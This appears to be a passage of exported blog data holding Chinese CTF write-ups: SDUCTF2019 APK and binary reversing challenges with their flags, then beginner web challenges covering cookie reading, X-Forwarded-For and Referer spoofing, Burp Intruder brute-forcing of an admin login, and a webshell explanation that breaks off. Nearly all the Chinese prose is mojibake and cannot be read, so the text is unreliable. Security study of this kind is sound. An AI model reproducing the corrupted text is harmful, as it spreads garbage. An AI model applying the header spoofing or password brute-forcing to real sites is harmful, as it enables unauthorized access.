MjU7JiN4MzM7JiN4MzM7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzI7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzA7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzQ7\n ä¸€çœ‹è¿™ç§å°±æ˜¯æ··åˆå¯†ç ï¼Œé ç›´è§‰å…ˆè§£ä¸€æ³¢base64ï¼Œç„¶åå‘ä¸‹å¯ä»¥è§£ä¸‹å»ï¼Œå‘ä¸€æ³¢è§£å¯†é¡ºåºï¼Œå¿˜è®°å½•flagäº†ã€‚\nï¼ˆbase64-\u003eunicode-\u003eè½¬ä¸­æ–‡ï¼ˆutf-8)-\u003eurldecode-\u003ehex decodeï¼‰ Mobile 0x01 apk1  é¢˜ç›®æè¿°ï¼šç”¨ç€å®‰å“æ‰‹æœºï¼Œä½ æ‡‚apkå—ï¼Ÿ\n é€šè¿‡å·¥å…·d2j-dex2jarå’Œjd-guiä¸¤è€…é€†å‘apkå¾—åˆ°flag\n0x02 apk2  é¢˜ç›®æè¿°ï¼š ä½ çœŸçš„æ‡‚apkå—ï¼Ÿ\n é€šè¿‡å·¥å…·d2j-dex2jarå’Œjd-guiä¸¤è€…é€†å‘apkå¾—åˆ°flag\nç„¶åçœ‹ä»£ç å¯çŸ¥æ˜¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œä¸€ä¸ªæ’åºï¼Œå°†å­—ç¬¦ä¸²é‡Œçš„ç¬¬iä½æ”¾åˆ°s2[i]ä½ï¼Œå¾—åˆ°ç»“æœ\nç›´æ¥å†™ä¸€ä¸ªpythonè„šæœ¬å¾—åˆ°flag\n0x03 apk3  é¢˜ç›®æè¿°ï¼šå†æ¥ä¸€å‘ï¼Œå¬è¯´è¿‡Kotlinå—ï¼Ÿ\n ä¸‹ä¸‹æ¥è§£å‹æŒ‰å¥—è·¯æ‹–ç»™d2j-dex2jarç„¶åå‘ç°æœ‰ä¸¤ä¸ª.dexåç¼€çš„æ–‡ä»¶ï¼Œé€†å‘æŠ¥é”™\näºæ˜¯ç°å»ç½‘ä¸Šä¸‹äº†ä¸€ä¸ªjebé€†å‘ï¼Œç„¶åæ‰¾ä¸€ä¸ªæ ·ä¾‹ç°å­¦jeb\nç›´è§‰çœ‹è¿™ä¸ªå­—ç¬¦ä¸²æœ‰ç”¨ï¼Œç„¶ååœ¨ä¸‹é¢æœç„¶å‘ç°\nplayå‡½æ•°å°±æ˜¯å¯¹è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ¯”å¯¹ï¼Œå°±æ˜¯å°†å­—ç¬¦ä¸²çš„å¶æ•°ä½çš„asciiå€¼å‡2ï¼Œå¾—åˆ°æ–°ä¸²ä¸è¯¥å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒ\nå†™ä¸ªpythonè„šæœ¬é€†ç€åŠ å›å»å¯å¾—flag\napk3ï¼šsductf{Easy_Apk_1s_n0t_hard_4_U!}\n1 2 3 4 5 6 7 8 9 10 11  \u003e\u003e\u003ef 'a2P1W3Pmc0Tha3jfOX@rVzDzV22wbF7oWXHkVzPfTSD9' \u003e\u003e\u003e for i in f: ... if cnt%2 == 0: ... s += chr(ord(i)+2) ... else: ... s+=i ... cnt += 1 ... \u003e\u003e\u003e s 'c2R1Y3Rme0Vhc3lfQXBrXzFzX24wdF9oYXJkXzRfVSF9'   0x04 FuckAPP  é¢˜ç›®æè¿°ï¼š ä½ çœŸçš„æ‡‚apkå—ï¼Ÿ\n å¸¸è§„ï¼Œæ‹–è¿›jebçœ‹mainå‡½æ•°ï¼Œå‘ç°åªæœ‰ä¸€äº›setViewIDä¹‹ç±»çš„å‡½æ•°å¹¶æ²¡æœ‰ä¸»è¦çš„é€»è¾‘ï¼Œäºæ˜¯å›å»å°†apkè§£å‹ç¼©\nå‘ç°åŒ…é‡Œå’Œä»¥å‰çš„apkè§£å‹ä¸åŒï¼Œapk3æ˜¯å¤šäº†ä¸€ä¸ªKotlinæ–‡ä»¶å¤¹ï¼Œè€Œè¿™ä¸ªfuck app æ˜¯å¤šäº†ä¸€ä¸ªlibæ–‡ä»¶å¤¹ï¼ŒçŒœä¸»è¦çš„å‡½æ•°åœ¨é‡Œé¢ï¼Œæ‰“å¼€lib/arm64-v8aå¾—åˆ°ä¸€ä¸ªlibnative-lib.soï¼Œæ‹–è¿›IDAé‡Œè¿›è¡Œé€†å‘\næš´åŠ›æœä¸€æ³¢æœç„¶çœ‹åˆ°äº†flagï¼Œç›´æ¥å¾—åˆ°flagï¼Œè¿˜ä»¥ä¸ºè¦çœ‹å‡½æ•°é€»è¾‘ã€‚\nReverse 0x01 Java jar  é¢˜ç›®æè¿°ï¼š éƒ½æ˜¯javaç¨‹åºå‘˜ï¼Œäº’ç›¸å·ä¸ªä»£ç è°ä¸ä¼šå‘€ï¼\n ä¸‹è½½é™„ä»¶å¾—åˆ°jaråŒ…ï¼Œç›´æ¥è§£å‹å¾—åˆ°æ–‡ä»¶ï¼Œæ‰“å¼€main.classï¼Œçœ‹åˆ°flagæ˜æ–‡å°±åœ¨main.classé‡Œ\n0x02 C#  é¢˜ç›®æè¿°ï¼š C#ç®€ç›´è·Ÿjavaä¸€æ ·ï¼Œä¼šjavaå°±è‡ªç„¶ä¸Šæ‰‹c#äº†ã€‚\n ä¸‹è½½é™„ä»¶å¾—åˆ°sductf.exeï¼Œæ‹–å…¥è¾£ä¸ªå¥³äººidaè¿›è¡Œé€†å‘ï¼Œç›´æ¥å¾—åˆ°flag\n0x03 Rust  é¢˜ç›®æè¿°ï¼š ä½ å¬è¯´è¿‡Rustè¯­è¨€å—ï¼Ÿ æ®è¯´å®ƒéå¸¸å®‰å…¨ã€‚\n æ²¡æ¥è§¦è¿‡rustè¯­è¨€ï¼Œä¸è¿‡æ®è¯´é€†å‘ä¸çŸ¥é“ç¨‹åºé€†å‘ç»“æ„æ—¶ï¼Œæœ€å¥½è‡ªå·±å†™ä¸ªç¨‹åºHelloWorldè¿›è¡Œé€†å‘ä¸€æ³¢çœ‹ç»“æ„ï¼Œä½†æ˜¯æˆ‘å·æ‡’äº†ã€‚\nç›´æ¥ç™¾åº¦æœç´¢ï¼šrusté€†å‘\nhttps://www.anquanke.com/post/id/169970\nhttps://blog.csdn.net/qq_33438733/article/details/81138573\nçœ‹å®Œé“¾æ¥ä¹‹åæ‰“å¼€idaï¼Œè¿˜éœ€è¦64bitçš„è¾£ä¸ªå¥³äººã€‚\nä¹±é€›å‘ç°æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è§£ç å‡ºæ¥æ˜¯ä¸€ä¸ªå¥‡æ€ªçš„ä¸œè¥¿ï¼Œç»§ç»­æ‰¾ä¸»å‡½æ•°main\nä¸»å‡½æ•°å…¥å£\nç‚¹è¿›ç¬¬ä¸€ä¸ªå‡½æ•°æŸ¥çœ‹æµç¨‹\næ—¢ç„¶æ˜¯é€†å‘ï¼Œé‚£å°±ä»å°¾éƒ¨å¾€åé¢çœ‹ï¼Œæœç„¶çœ‹åˆ°ä¸€ä¸ªåˆ¤æ–­å’Œä¸€ä¸ªç±»ä¼¼flagçš„å­—ç¬¦ä¸²c2R1Y3Rme0lfbDB2ZV9ydXN0X2hoaGh9ï¼Œbase64è§£ç å¾—åˆ°flagï¼šsductf{I_l0ve_rust_hhhh}\n0x04 EasyCrackMe  é¢˜ç›®æè¿°ï¼šæ— \n ä¸‹ä¸‹æ¥æ˜¯ä¸€ä¸ªexeæ–‡ä»¶ï¼Œç”¨010editoræ‰“å¼€ï¼Œå‘ç°è¯´æ˜¯PEæ–‡ä»¶ï¼Œè€Œä¸”ä¹Ÿå‘ç°æ˜¯PEæ–‡ä»¶å¤´ï¼Œäºæ˜¯æ‹–è¿›å»IDAé€†å‘ã€‚\né€†å‘mainå‡½æ•°æ— æ€è·¯ï¼Œä¾¿å¼€TextViewæŸ¥çœ‹ï¼Œçœ‹åˆ°å¦‚ä¸‹å›¾é»„è‰²å­—ç¬¦ä¸²æ„Ÿè§‰å¾ˆå¥‡æ€ªï¼Œè€Œä¸”ä¸‹é¢æœ‰ä¸€ä¸ªCongratulationsï¼ï¼ŒçŒœæµ‹è¿™æ®µå­—ç¬¦ä¸²æ˜¯flag\nF5è¿›å…¥æŸ¥çœ‹å…·ä½“å‡½æ•°ï¼Œå¤§æ¦‚æ˜¯å¯¹è¾“å…¥å­—ç¬¦ä¸²çš„æ¯ä¸€ä½ä¸0x16è¿›è¡Œå¼‚æˆ–å¾—åˆ°v5å­—ç¬¦ä¸²\näºæ˜¯ç”¨pythoné€†å‡½æ•°ä¸€æ³¢ï¼Œæœç„¶å¾—åˆ°flag\nåœ¨åé¢å†™wpæ—¶ï¼Œå®Œå–„äº†æ€è·¯ã€‚\nå› ä¸ºè¿›å»è¿è¡Œæç¤ºè¾“å…¥ä¸€ä¸ªkeyï¼Œç„¶åå°±åœ¨IDAçš„TextViewæœç´¢keyï¼Œå¾—åˆ°ç¬¬ä¸€å¼ å›¾çš„å‡½æ•°å…¥å£ï¼Œæ¥ä¸‹æ¥çœ‹é€»è¾‘å³å¯ã€‚\n","description":"","tags":["ctf"],"title":"SDUCTF2019-wp","uri":"/posts/sductf2019-wp/"},{"categories":["web"],"content":"Web\u0026WriteUp Webå¦‚åŒä¸€åº§æ­£ä¸‰è§’å†°å±±ï¼Œç­‰ç€å»æ¢ç´¢ã€‚ã€‚ã€‚\næ”»é˜²ä¸–ç•Œ\u0026Webæ–°æ‰‹ç»ƒä¹ åŒº 0x01 view_source  é¢˜ç›®æè¿°ï¼šXè€å¸ˆè®©å°å®åŒå­¦æŸ¥çœ‹ä¸€ä¸ªç½‘é¡µçš„æºä»£ç ï¼Œä½†å°å®åŒå­¦å‘ç°é¼ æ ‡å³é”®å¥½åƒä¸ç®¡ç”¨äº†ã€‚\n åˆ©ç”¨view-source://urlæˆ–è€…f12æˆ–è€…å³é”®æŸ¥çœ‹æºç ï¼Œflagå°±åœ¨æºç é‡Œ\n0x02 get_post  é¢˜ç›®æè¿°ï¼šXè€å¸ˆå‘Šè¯‰å°å®åŒå­¦HTTPé€šå¸¸ä½¿ç”¨ä¸¤ç§è¯·æ±‚æ–¹æ³•ï¼Œä½ çŸ¥é“æ˜¯å“ªä¸¤ç§å—ï¼Ÿ\n åˆ©ç”¨burp suite å‘åŒ…å¾—åˆ°flag\nå¦ä¸€ç§æ€è·¯æ˜¯åˆ©ç”¨pythonçš„requestsåº“å‘é€è¯·æ±‚ã€‚\n0x03 robots  é¢˜ç›®æè¿°ï¼šXè€å¸ˆä¸Šè¯¾è®²äº†Robotsåè®®ï¼Œå°å®åŒå­¦å´ä¸Šè¯¾æ‰“äº†çŒç¡ï¼Œèµ¶ç´§æ¥æ•™æ•™å°å®Robotsåè®®æ˜¯ä»€ä¹ˆå§ã€‚\n æŸ¥çœ‹æºç è‚¯å®šæ˜¯æ²¡æœ‰flagçš„ï¼Œæ ¹æ®é¢˜ç›®robotså¯è”æƒ³åˆ°webçš„robots.txtåè®®\n robots.txtåè®®æ˜¯åœ¨Webç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹è®¾ç½®ä¸€ä¸ªrobots.txtæ–‡ä»¶ï¼Œè§„å®šç«™ç‚¹ä¸Šçš„å“ªäº›åŒºåŸŸæˆ–è€…å“ªäº›é¡µé¢æ˜¯é™åˆ¶æœç´¢çš„ã€‚æœç´¢ç¨‹åºå°†å‚è€ƒè¯¥æ–‡ä»¶ï¼Œå†³å®šç«™ç‚¹ä¸­çš„å“ªäº›åŒºåŸŸæ˜¯ä¸å…è®¸æœç´¢çš„ï¼Œå¹¶åœ¨æ¥ä¸‹æ¥çš„æœç´¢è¿‡ç¨‹ä¸­è·³è¿‡è¿™äº›åŒºåŸŸã€‚\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š\n#robots.txt for http://somehost.com User-agent: * Disallow: /cgi-bin Disallow: /registration ç¤ºä¾‹ä¸­ç¬¬ä¸€è¡Œæ˜¯ä¸€è¡Œæ³¨é‡Šï¼Œæ³¨é‡Šä»¥ä¸€ä¸ª#å¼€å¤´ã€‚\n User-agentï¼šæŒ‡è®¿é—®ç«™ç‚¹çš„ç¨‹åºï¼Œæ¯ä¸ªæµè§ˆå™¨éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„User-agentå€¼ï¼Œæµè§ˆå™¨åœ¨å‘WebæœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ä¼šåœ¨æ¯ä¸ªè¯·æ±‚ä¸­éƒ½é™„åŠ è¿™ä¸ªå€¼ã€‚Webç«™ç‚¹é€šè¿‡åœ¨robots.txtä¸­ä½¿ç”¨User-agentå°±å¯ä»¥é’ˆå¯¹ä¸åŒçš„User-agentè®¾ç½®ä¸åŒçš„è§„åˆ™ã€‚ Disallowæ˜¯æ‹’ç»è¯­å¥ï¼Œå®šä¹‰äº†æœç´¢ç¨‹åºä¸å…è®¸è®¿é—®çš„Webç«™ç‚¹è·¯å¾„ã€‚æ‹’ç»è¯­å¥åªé’ˆå¯¹è·¯å¾„è¿›è¡Œè®¾ç½®ï¼Œä¸é’ˆå¯¹å…·ä½“çš„æ–‡ä»¶ã€‚   ç›´æ¥è®¿é—®http://xxx.xxx.xxx.xxx/robots.txt\nå¾—åˆ°ä¸€ä¸ªphpè·¯å¾„ï¼Œç›´æ¥è®¿é—®å¾—åˆ°flag\n0x04 backup  é¢˜ç›®æè¿°ï¼šXè€å¸ˆå¿˜è®°åˆ é™¤å¤‡ä»½æ–‡ä»¶ï¼Œä»–æ´¾å°å®åŒå­¦å»æŠŠå¤‡ä»½æ–‡ä»¶æ‰¾å‡ºæ¥,ä¸€èµ·æ¥å¸®å°å®åŒå­¦å§ï¼\n phpçš„å¤‡ä»½æœ‰ä¸¤ç§ï¼š.php~å’Œ.php.bak\nå¦‚æœç½‘ç«™å­˜åœ¨å¤‡ä»½æ–‡ä»¶ï¼Œåœ¨åœ°å€æ æœ€æœ«åŠ ä¸Š/index.php~æˆ–/index.php.bakï¼Œå³å¯å¾—åˆ°å¤‡ä»½æ–‡ä»¶ index.php.bak\nè®¿é—® http://url/index.php.bak å³è‡ªåŠ¨ä¸‹è½½äº†index.php.bakï¼Œæ‰“å¼€æŸ¥çœ‹flagå°±åœ¨é‡Œé¢\n0x05 cookie  é¢˜ç›®æè¿°ï¼šXè€å¸ˆå‘Šè¯‰å°å®ä»–åœ¨cookieé‡Œæ”¾äº†äº›ä¸œè¥¿ï¼Œå°å®ç–‘æƒ‘åœ°æƒ³ï¼šâ€˜è¿™æ˜¯å¤¹å¿ƒé¥¼å¹²çš„æ„æ€å—ï¼Ÿâ€™\n chromeåœ¨consoleä¸­è¾“å…¥å‘½ä»¤javascript:alert(document.cookie) \nå…¶å®åœ¨åœ°å€æ è¾“å…¥ä¹Ÿå¯ä»¥å®ç°\nå¼¹å‡º look-here=cookie.php\nè®¿é—®url/cookie.phpçœ‹åˆ°See the http response\næ‰“å¼€F12å¼€å‘è€…æ¨¡å¼çš„Networkï¼ŒæŸ¥çœ‹cookie.phpçš„å›åº”ï¼ŒResponseé‡Œæ²¡æ‰¾åˆ°flagï¼Œæœ€ååœ¨Response Headersé‡Œæ‰¾åˆ°flag\n0x06 disabled button  é¢˜ç›®æè¿°ï¼šXè€å¸ˆä»Šå¤©ä¸Šè¯¾è®²äº†å‰ç«¯çŸ¥è¯†ï¼Œç„¶åç»™äº†å¤§å®¶ä¸€ä¸ªä¸èƒ½æŒ‰çš„æŒ‰é’®ï¼Œå°å®æƒŠå¥‡åœ°å‘ç°è¿™ä¸ªæŒ‰é’®æŒ‰ä¸ä¸‹å»ï¼Œåˆ°åº•æ€ä¹ˆæ‰èƒ½æŒ‰ä¸‹å»å‘¢ï¼Ÿ\n æ˜æ˜¾æ˜¯ä¸€ä¸ªç°è‰²çš„æŒ‰é’®ï¼ŒæŸ¥çœ‹æºç æœ‰\u003cbutton disabled\u003eè·Ÿhackergame2019çš„ç­¾åˆ°é¢˜ä¸€æ ·ï¼ŒæŠŠdisabledåˆ æ‰ç‚¹å‡»æŒ‰é’®å³å¯ã€‚\n0x07 simple_js  é¢˜ç›®æè¿°ï¼šå°å®å‘ç°äº†ä¸€ä¸ªç½‘é¡µï¼Œä½†å´ä¸€ç›´è¾“ä¸å¯¹å¯†ç ã€‚(Flagæ ¼å¼ä¸º Cyberpeace{xxxxxxxxx} )\n å…ˆè¾“å…¥ä»»æ„å­—ç¬¦è¿›å…¥é¡µé¢æŸ¥çœ‹æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  \u003cscript\u003e function dechiffre(pass_enc){ var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = \"\";i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i \u003c (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;} for(i = (o=0); i \u003c (k = j = n); i++ ){ o = tab[i-l]; if(i \u003e 5 \u0026\u0026 i \u003c k-1) p += String.fromCharCode((o = tab2[i])); } p += String.fromCharCode(tab2[17]); pass = p;return pass; } String[\"fromCharCode\"](dechiffre(\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\")); h = window.prompt('Enter password'); alert( dechiffre(h) ); \u003c/script\u003e   çœ‹æºç å¾—çŸ¥ä¸è®ºè¾“å…¥ä»€ä¹ˆéƒ½ä¼šè·³è½¬è‡³å‡å¯†ç ç„¶åå¤±è´¥ï¼Œäºæ˜¯ç›´æ¥å¤„ç†fromCharCodeï¼Œå¾—åˆ°flag\n1 2 3 4 5 6 7 8 9 10 11  \u003e\u003e\u003e s = \"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\" \u003e\u003e\u003e print(s) \"55,56,54,79,115,69,114,116,107,49,50\" \u003e\u003e\u003e a = [55,56,54,79,115,69,114,116,107,49,50] \u003e\u003e\u003e s = \"\" \u003e\u003e\u003e for i in a: ... b =chr(i) ... s += b \u003e\u003e\u003e print(s) 786OsErtk12   0x08 xff referer  é¢˜ç›®æè¿°ï¼šXè€å¸ˆå‘Šè¯‰å°å®å…¶å®xffå’Œrefereræ˜¯å¯ä»¥ä¼ªé€ çš„\n ç›´æ¥è®¿é—®ç½‘ç«™ï¼Œæç¤ºéœ€è¦ç‰¹å®šipè®¿é—®\nç”±é¢˜ç›®æè¿°çŒœæƒ³æ˜¯æ”¹httpè¯·æ±‚ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥.\nç™¾åº¦xffå¯çŸ¥\n X-Forwarded-Forä½äºHTTPåè®®çš„è¯·æ±‚å¤´ï¼Œ æ˜¯ä¸€ä¸ª HTTP æ‰©å±•å¤´éƒ¨ã€‚HTTP/1.1ï¼ˆRFC 2616ï¼‰åè®®å¹¶æ²¡æœ‰å¯¹å®ƒçš„å®šä¹‰ï¼Œå®ƒæœ€å¼€å§‹æ˜¯ç”± Squid è¿™ä¸ªç¼“å­˜ä»£ç†è½¯ä»¶å¼•å…¥ï¼Œç”¨æ¥è¡¨ç¤º HTTP è¯·æ±‚ç«¯çœŸå® IPã€‚å¦‚ä»Šå®ƒå·²ç»æˆä¸ºäº‹å®ä¸Šçš„æ ‡å‡†ï¼Œè¢«å„å¤§ HTTP ä»£ç†ã€è´Ÿè½½å‡è¡¡ç­‰è½¬å‘æœåŠ¡å¹¿æ³›ä½¿ç”¨ï¼Œå¹¶è¢«å†™å…¥RFC 7239ï¼ˆForwarded HTTP Extensionï¼‰æ ‡å‡†ä¹‹ä¸­ã€‚\n åˆ©ç”¨burpsuiteç›´æ¥ä¼ªé€ http header çš„ X-Forwarded-Forï¼Œ X-Forwarded-For è¯·æ±‚å¤´æ ¼å¼å¦‚ä¸‹\nX-Forwarded-For: client, proxy1, proxy2 å¯ä»¥çœ‹åˆ°ï¼ŒXFF çš„å†…å®¹ç”±ã€Œè‹±æ–‡é€—å· + ç©ºæ ¼ã€éš”å¼€çš„å¤šä¸ªéƒ¨åˆ†ç»„æˆï¼Œæœ€å¼€å§‹çš„æ˜¯ç¦»æœåŠ¡ç«¯æœ€è¿œçš„è®¾å¤‡ IPï¼Œç„¶åæ˜¯æ¯ä¸€çº§ä»£ç†è®¾å¤‡çš„ IP\nå¦‚æœä¸€ä¸ª HTTP è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ä¹‹å‰ï¼Œç»è¿‡äº†ä¸‰ä¸ªä»£ç† Proxy1ã€Proxy2ã€Proxy3ï¼ŒIP åˆ†åˆ«ä¸º IP1ã€IP2ã€IP3ï¼Œç”¨æˆ·çœŸå® IP ä¸º IP0ï¼Œé‚£ä¹ˆæŒ‰ç…§ XFF æ ‡å‡†ï¼ŒæœåŠ¡ç«¯æœ€ç»ˆä¼šæ”¶åˆ°ä»¥ä¸‹ä¿¡æ¯X-Forwarded-For: IP0, IP1, IP2\n PSï¼š Remote Address æ— æ³•ä¼ªé€ ï¼Œå› ä¸ºå»ºç«‹ TCP è¿æ¥éœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¦‚æœä¼ªé€ äº†æº IPï¼Œæ— æ³•å»ºç«‹ TCP è¿æ¥ï¼Œæ›´ä¸ä¼šæœ‰åé¢çš„ HTTP è¯·æ±‚\n ç„¶åå¾—åˆ°å¦‚ä¸‹é¡µé¢\nç™¾åº¦Referå¯çŸ¥\n HTTP_REFERERæä¾›äº†å¼•å¯¼ç”¨æˆ·ä»£ç†åˆ°å½“å‰é¡µçš„å‰ä¸€é¡µçš„åœ°å€ä¿¡æ¯ï¼Œå¸¸è§çš„ä¸€äº›åº”ç”¨åœºæ™¯æœ‰é˜²ç›—é“¾ï¼Œç»Ÿè®¡æ–‡ç« æœ‰å¤šå°‘æ¬¡æ˜¯æ¥è‡ªè°·æ­Œæœç´¢ç»“æœï¼Œå¤šå°‘æ¬¡æ¥è‡ªç™¾åº¦æœç´¢ç»“æœç­‰ã€‚\n   ä»€ä¹ˆæ—¶å€™è·å–ä¸åˆ°HTTP_REFERERå€¼  ç»¼ä¸Šæ‰€è¿°ï¼ŒHTTP_REFERERå­˜åœ¨éœ€è¦ä¸¤ä¸ªæ¡ä»¶ï¼š\næµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰è¯·æ±‚ï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚çš„æƒ…å†µä¸‹ï¼Œæ˜¯ä¸å­˜åœ¨HTTP_REFERERçš„ï¼Œä½†æ˜¯å¯ä»¥ä¼ªé€ headerï¼Œè¿™åœ¨ä¸‹ä¸€èŠ‚ä¸­å°†æåŠï¼‰ï¼› å­˜åœ¨å‰å¯¼é¡µï¼›\nâ€‹\tä»¥ä¸‹æ˜¯ä¸€äº›è·å–ä¸åˆ°HTTP_REFERERå€¼çš„æƒ…å†µï¼š\n  åœ¨æµè§ˆå™¨å†…ç›´æ¥æ•²URL\n  windowsæ¡Œé¢ä¸Šçš„è¶…é“¾æ¥å›¾æ ‡\n  æµè§ˆå™¨å†…ä¹¦ç­¾\n  ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼ˆå¦‚Wordï¼ŒExcelç­‰ï¼‰å†…å®¹ä¸­çš„é“¾æ¥\n  SSLè®¤è¯ç½‘ç«™è·³å…¥\n  \u003c http://example.com/â€œ\u003e metaé¡µé¢è®¾ç½®è‡ªåŠ¨è·³è½¬æ—¶ï¼Œåœ¨example.comå°†å–ä¸åˆ°REFERER URL\n  ä½¿ç”¨JavaScriptçš„Location.hrefæˆ–è€…æ˜¯Location.replace()\nåœ¨ä»¥ä¸‹æƒ…å†µä¸‹å¯ä»¥è·å–HTTP_REFERERå€¼ï¼š\n  ç›´æ¥ç”¨formæäº¤çš„è¡¨å•(POSTæˆ–GET)\n  srcè¯·æ±‚ï¼ˆå¦‚jsçš„scriptæ ‡ç­¾åŠhtmlä¸­imgæ ‡ç­¾çš„srcå±æ€§ï¼‰\n   ç›´æ¥ä¼ªé€ headerçš„Refererå±æ€§\nä½†æ˜¯æ²¡æœ‰å¾—åˆ°ç»“æœ\nåé¢ç™¾åº¦å‘ç°ï¼Œurl/xxxå’Œurl/xxx/æ˜¯ä¸ä¸€æ ·çš„ï¼Œurl/xxxæ˜¯ç›´æ¥è®¿é—®xxxçš„æ–‡ä»¶ï¼Œè€Œurl/xxx/æ˜¯è®¿é—®xxxç›®å½•ï¼Œå› æ­¤æˆ‘ä»¬åˆšæ‰å¾—ä¸åˆ°flagï¼Œå°†Refererçš„åé¢çš„æ–œæ å»æ‰ï¼Œå†æ¬¡è¯·æ±‚ï¼Œå¾—åˆ°flag\n0x09 weak_auth  é¢˜ç›®æè¿°ï¼šå°å®å†™äº†ä¸€ä¸ªç™»é™†éªŒè¯é¡µé¢ï¼Œéšæ‰‹å°±è®¾äº†ä¸€ä¸ªå¯†ç ã€‚\n ç›´æ¥ç‚¹loginè·³è½¬åˆ°äº†check.phpï¼Œæç¤ºï¼šplease login as admin\nç”¨adminç©ºå¯†ç å»ç™»é™†ï¼Œæ˜¾ç¤ºï¼špassword error\nç‚¹ç¡®è®¤ï¼ŒF12æŸ¥çœ‹æºç \u003cscript\u003ealert('password error');\u003c/script\u003e\u003c!--maybe you need a dictionary--\u003eæç¤ºå¯èƒ½éœ€è¦ä¸€ä¸ªå­—å…¸ï¼Œè‚¯å®šæ˜¯çˆ†ç ´äº†\nå› æ­¤ï¼Œæˆ‘å»å­¦ä¹ äº†BurpSuiteçš„IntruderåŠŸèƒ½â€”â€”ç”¨äºçˆ†ç ´çš„ä¸€ä¸ªå·¥å…·ã€‚\nå…³äºBurp Suite çš„Intruderæ¨¡å—çš„å››ç§é€‰é¡¹çš„è§£é‡Š https://howiezhao.github.io/2018/05/01/burpsuite-intruder-attack-type/\nå…³äºBurpSuiteçš„Intruderæ¨¡å—çš„è§£é‡Šï¼š https://www.cnblogs.com/yufusec/p/9179625.html\nç„¶åçˆ†ç ´å¾—åˆ°å¯†ç 123456ï¼Œè¿›å…¥ç³»ç»Ÿå¾—åˆ°flag\n0x0a webshell  é¢˜ç›®æè¿°ï¼šå°å®ç™¾åº¦äº†phpä¸€å¥è¯,è§‰ç€å¾ˆæœ‰æ„æ€,å¹¶ä¸”æŠŠå®ƒæ”¾åœ¨index.phpé‡Œã€‚\n  webshellå°±æ˜¯ä»¥aspã€phpã€jspæˆ–è€…cgiç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°† å…¶ç§°åšä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚é»‘å®¢åœ¨å…¥ä¾µäº†ä¸€ä¸ªç½‘ç«™åï¼Œé€šå¸¸ä¼šå°†aspæˆ–phpåé—¨æ–‡ä»¶ä¸ç½‘ç«™æœ åŠ¡å™¨WEBç›®å½•ä¸‹æ­£å¸¸çš„ç½‘é¡µæ–‡ä»¶æ··åœ¨ä¸€èµ·ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®aspæˆ–è€…phpåé—¨ï¼Œå¾—åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä»¥è¾¾åˆ°æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ã€‚ é¡¾åæ€ä¹‰ï¼Œ\"web\"çš„å«ä¹‰æ˜¯æ˜¾ç„¶éœ€è¦æœåŠ¡å™¨å¼€æ”¾webæœåŠ¡ï¼Œ\"shell\"çš„å«ä¹‰æ˜¯å–å¾—å¯¹æœåŠ¡å™¨æŸ ç§ç¨‹åº¦ä¸Šæ“ä½œæƒé™ã€‚webshellå¸¸å¸¸è¢«ç§°ä¸ºå…¥ä¾µè€…é€šè¿‡ç½‘ç«™ç«¯å£å¯¹ç½‘ç«™æœåŠ¡å™¨çš„æŸç§ç¨‹åº¦ä¸Šæ“ ä½œçš„æƒé™ã€‚ç”±äºwebshellå…¶å¤§å¤šæ˜¯ä»¥åŠ¨æ€è„šæœ¬çš„å½¢å¼å‡ºç°ï¼Œä¹Ÿæœ‰äººç§°ä¹‹ä¸ºç½‘ç«™çš„åé—¨å·¥å…·ã€‚ é¦–å…ˆæ–°å»ºä¸€ä¸ªindex.phpæ–‡ä»¶ï¼ŒæŠŠPHPä»£ç è¾“å…¥åˆ°é‡Œé¢ï¼Œç”µè„‘å¯èƒ½ä¼šè‡ªåŠ¨è¯†åˆ«å®ƒä¸ºç—…æ¯’ï¼Œå¹¶ åˆ 